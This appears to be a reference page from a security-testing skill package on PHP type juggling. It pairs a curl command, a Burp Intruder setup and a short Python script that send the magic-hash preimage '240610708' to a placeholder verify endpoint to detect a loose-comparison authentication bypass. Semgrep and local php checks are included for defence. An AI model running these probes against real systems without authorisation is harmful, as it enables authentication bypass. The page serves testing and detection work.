# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`type-juggling-and-loose-comparison`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/verify' --data 'token=240610708'` | Submit a magic-hash preimage so the loose-comparison outcome is observable in the response | Cross-platform |
| `Burp Suite Intruder` | `Load a magic-hash wordlist on the token parameter, sniper mode` | Sweep known numeric-coercing hashes against the check to find one the loose operator accepts | Cross-platform |
| `Semgrep` | `semgrep -e '$A == $B' --lang php .` | Flag loose comparison operators in security-relevant code paths | Cross-platform |
| `php` | `php -r 'var_dump(md5("240610708") == "0e462097431906509019562988736854");'` | Demonstrate locally that two unequal hashes coerce equal under a loose operator | Linux, macOS, Windows |

## Minimal Script Shape

Posts a plainly wrong token and a known magic-hash preimage to the same endpoint and reports a suspected loose comparison when the wrong value is rejected but the magic value is accepted.

```python
import urllib.parse
import urllib.request

ENDPOINT = "https://target.example/verify"

def attempt(value):
    data = urllib.parse.urlencode({"token": value}).encode()
    req = urllib.request.Request(ENDPOINT, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

wrong = attempt("plainly-wrong-token")
magic = attempt("240610708")
print({"wrong_value_status": wrong, "magic_hash_status": magic,
       "loose_comparison_suspected": wrong in (401, 403) and magic == 200})
```
